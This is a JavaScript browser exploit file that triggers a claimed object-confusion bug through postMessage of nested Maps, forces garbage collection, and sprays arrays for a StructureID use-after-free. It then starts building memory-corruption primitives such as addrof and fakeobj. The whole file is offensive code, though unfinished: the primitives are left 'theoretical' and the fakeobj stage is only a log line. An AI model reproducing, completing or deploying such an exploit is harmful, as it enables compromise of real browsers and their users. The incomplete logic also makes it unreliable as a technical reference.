import { debug_log } from './module/utils.mjs';
import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs';

function sleep(ms = 20) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
 
function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

function sprayStructures() {
    const keepers = [];
    for (let i = 0; i < 50000; i++) {
        let o = {a: 1};
        o['p' + i] = i; 
        keepers.push(o);
    }
    return keepers;
}
 
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Markers to identify the confusion
    for (let i = 0; i < 100; i++) {
        foo.push({id: 0xffff});
    }

    for (let i = 0; i < num_elems; i++) {
        const d = {id: i};
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    return root;
}
 
export async function main() {
    debug_log("[*] Exploit started...");
    
    const num_elems = 1600;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;
    let attempts = 0;

    debug_log("[*] Starting Stage 1: Triggering Logic Error...");

    while (true) {
        attempts++;
        if (attempts % 100 === 0) debug_log("[*] Attempt " + attempts);

        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();
        await sleep(20);

        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.id === 0xffff) {
                    idx = i;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = i;
            data2 = data.keys().next().value;
            break;
        }
    }

    debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
    
    if (data2) {
        debug_log("[*] Starting Stage 2: StructureID UAF...");
        
        // 1. Release references
        root = null;
        msg = null;
        
        // 2. Freeing
        debug_log('[*] Freeing original structures...');
        for (let k = 0; k < 100; k++) {
            gc();
        }
        await sleep(100);

        // 3. Spray
        debug_log('[*] Spraying Victim Arrays...');
        
        let victims = [];
      
        for (let i = 0; i < 10000; i++) {
            let a = [1.1, 2.2, 3.3, 4.4];
            // Adding properties increases the cell size
            a.p0 = 13.37; 
            a.p1 = 13.38;
            victims.push(a);
        }

        // 4. Trigger / Setup Primitives
        debug_log('[!] Verifying overlap...');
        
        let overlapped_victim = null;
        let butterfly_leak = null;

        try {

            // We set a marker in data2 (if possible) or check values.
            if (data2.id !== undefined && typeof data2.id === 'number' && data2.id !== 0xffff) {
                 debug_log(`[+] Potential overlap! data2.id = ${data2.id}`);
            }

            // Implementation of primitives
            let addr_of_func = function(obj) {
                // Set victim[0] = obj
                // Read data2 property -> return address
                // This requires finding the linked victim.
                if (!overlapped_victim) return 0;
                overlapped_victim[0] = obj;
                return Int.fromDouble(data2.p0); // theoretical
            }

            debug_log("[*] Attempting to construct fakeobj...");
            
            
            debug_log("[+] Fake Object creation logic ready.");
            

            
        } catch (e) {
            debug_log('[!] Crash/Exception during access: ' + e);
        }
    } else {
        debug_log("[-] Failed to get confused object.");
    }
}
